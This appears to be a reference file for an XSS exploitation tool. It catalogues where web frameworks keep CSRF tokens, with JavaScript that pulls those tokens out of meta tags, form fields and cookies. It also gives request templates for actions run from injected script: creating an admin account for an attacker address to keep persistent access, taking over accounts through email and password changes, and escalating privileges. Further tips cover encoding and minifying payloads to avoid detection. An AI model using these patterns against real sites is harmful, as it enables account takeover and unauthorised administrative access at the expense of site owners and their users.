# Scenario Patterns

Common XSS-to-action exploitation scenarios with input patterns and expected configurations.

## Token Location Patterns

### 1. Meta Tag Token

**Indicators:**
- Rails applications
- Modern SPAs (React, Vue)
- Laravel with Blade templates

**Detection:**
```javascript
// Check if meta tag exists
document.querySelector('meta[name="csrf-token"]') !== null
document.querySelector('meta[name="csrf-param"]') !== null  // Rails-specific
```

**Common Meta Tag Names:**
| Framework | Meta Name | Content Attribute |
|-----------|-----------|-------------------|
| Rails | `csrf-token` | Token value |
| Rails | `csrf-param` | Field name (`authenticity_token`) |
| Laravel | `csrf-token` | Token value |
| Django | `csrf-token` | Token value |
| Custom | `_csrf`, `csrfToken`, `xsrf-token` | Varies |

**Extraction Pattern:**
```javascript
const csrfToken = document.querySelector('meta[name="csrf-token"]')?.content;
```

---

### 2. Form Field Token

**Indicators:**
- Traditional server-rendered pages
- Django applications
- ASP.NET applications
- Forms without JavaScript frameworks

**Detection:**
```javascript
// Check for hidden CSRF inputs
document.querySelector('input[name="csrfmiddlewaretoken"]') !== null  // Django
document.querySelector('input[name="__RequestVerificationToken"]') !== null  // ASP.NET
document.querySelector('input[name="_token"]') !== null  // Laravel
document.querySelector('input[name="authenticity_token"]') !== null  // Rails forms
```

**Common Field Names:**
| Framework | Field Name |
|-----------|------------|
| Django | `csrfmiddlewaretoken` |
| ASP.NET | `__RequestVerificationToken` |
| Laravel | `_token` |
| Rails | `authenticity_token` |
| Spring | `_csrf` |
| Express/csurf | `_csrf` |
| Symfony | `_csrf_token` |

**Extraction Pattern:**
```javascript
const csrfToken = document.querySelector('input[name="csrfmiddlewaretoken"]')?.value;
```

---

### 3. Cookie Token

**Indicators:**
- Angular applications (HttpClient)
- Laravel with XSRF-TOKEN cookie
- Double Submit Cookie pattern implementations

**Detection:**
```javascript
// Check for CSRF cookies
document.cookie.includes('XSRF-TOKEN')
document.cookie.includes('csrftoken')  // Django
document.cookie.includes('CSRF-TOKEN')
```

**Common Cookie Names:**
| Framework | Cookie Name | Notes |
|-----------|-------------|-------|
| Angular | `XSRF-TOKEN` | URL-encoded, expects `X-XSRF-TOKEN` header |
| Laravel | `XSRF-TOKEN` | URL-encoded |
| Django | `csrftoken` | Plain value |
| Spring | `XSRF-TOKEN` | Default |
| Custom | Varies | Check Set-Cookie headers |

**Extraction Pattern:**
```javascript
function getCookie(name) {
  const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
  return match ? decodeURIComponent(match[2]) : null;
}
const csrfToken = getCookie('XSRF-TOKEN');
```

**Important:** Laravel/Angular cookies are URL-encoded. Use `decodeURIComponent()`.

---

### 4. API Endpoint Token

**Indicators:**
- Single Page Applications (SPAs)
- Token refresh mechanisms
- Custom CSRF implementations

**Detection:**
- Check network tab for `/csrf`, `/api/csrf-token`, `/auth/csrf` endpoints
- Look for token in initial page load JSON

**Common Patterns:**
```javascript
// Dedicated endpoint
const response = await fetch('/api/csrf-token');
const { token } = await response.json();

// From initial state (React/Vue SSR)
const csrfToken = window.__INITIAL_STATE__.csrfToken;
const csrfToken = window.APP_CONFIG.csrfToken;
```

---

## Target Action Patterns

### Pattern 1: Admin User Creation

**Scenario:** Create a new admin user to maintain persistent access.

**Input template:**
```
Token location: [meta tag | form field | cookie]
Endpoint: /admin/users/invite
Method: POST
Content-Type: application/json
Body: { "email": "attacker@evil.com", "role": "admin" }
```

**Variations by framework:**

**Rails:**
```javascript
{ user: { email: "attacker@evil.com", role: "admin" } }
```

**Django:**
```javascript
{ email: "attacker@evil.com", is_staff: true, is_superuser: true }
```

**Laravel:**
```javascript
{ email: "attacker@evil.com", role_id: 1 }  // 1 = admin role
```

---

### Pattern 2: Account Takeover (Email Change)

**Scenario:** Change victim's email to attacker-controlled, then reset password.

**Input template:**
```
Token location: [meta tag | form field | cookie]
Endpoint: /api/user/email OR /settings/email
Method: POST | PUT | PATCH
Content-Type: application/json
Body: { "email": "attacker@evil.com" }
```

**Notes:**
- Some apps require current password - check for this
- Some apps send confirmation email - may need to confirm from attacker inbox
- Check if endpoint returns new email in response (for verification)

---

### Pattern 3: Privilege Escalation

**Scenario:** Elevate current user's role to admin.

**Input template:**
```
Token location: [meta tag | form field | cookie]
Endpoint: /api/user/role OR /admin/users/{user_id}
Method: PUT | PATCH
Content-Type: application/json
Body: { "role": "admin" } OR { "is_admin": true }
```

---

### Pattern 4: Password Change

**Scenario:** Change victim's password (if no current password required).

**Input template:**
```
Token location: [meta tag | form field | cookie]
Endpoint: /api/user/password OR /settings/password
Method: POST | PUT
Content-Type: application/json
Body: { "password": "newpassword123", "password_confirmation": "newpassword123" }
```

---

## Constraint Patterns

### Same-Origin Constraint

**When specified:**
- All requests go to same domain
- `credentials: 'same-origin'` in fetch
- No cross-origin exfiltration

**Payload behavior:**
- No `Image().src` to external domains
- No `fetch()` to attacker servers
- All data stays within victim's browser

### URL Encoding Constraint

**When specified:**
- Reflected XSS with limited character set
- Payload injected via URL parameter
- Characters like `<`, `>`, `"` may be encoded

**Payload adaptation:**
- Use URL-safe characters where possible
- Encode the entire payload as URL-safe base64
- Consider using `atob()` for decoding

### Minification Constraint

**When specified:**
- Tight injection point (character limit)
- Need to avoid detection
- Stored XSS with limited storage

**Techniques:**
- Remove whitespace and comments
- Shorten variable names to single characters
- Use arrow functions
- Remove optional semicolons
- Use ternary operators instead of if/else

---

## Input Validation Rules

### Token Location Validation

| Input | Valid Format | Example |
|-------|-------------|---------|
| Meta tag name | `^[a-zA-Z][a-zA-Z0-9_-]*$` | `csrf-token`, `_csrf` |
| Form field name | `^[a-zA-Z][a-zA-Z0-9_-]*$` | `csrfmiddlewaretoken` |
| Cookie name | `^[a-zA-Z][a-zA-Z0-9_-]*$` | `XSRF-TOKEN` |
| API endpoint | `^/[a-zA-Z0-9/_-]*$` | `/api/csrf` |

### Target Action Validation

| Input | Valid Format | Example |
|-------|-------------|---------|
| Endpoint | Relative URL starting with `/` | `/admin/users` |
| Method | `POST`, `PUT`, `PATCH`, `DELETE` | `POST` |
| Content-Type | `application/json` or `application/x-www-form-urlencoded` | `application/json` |
| Body | Valid JSON object | `{"email": "..."}` |
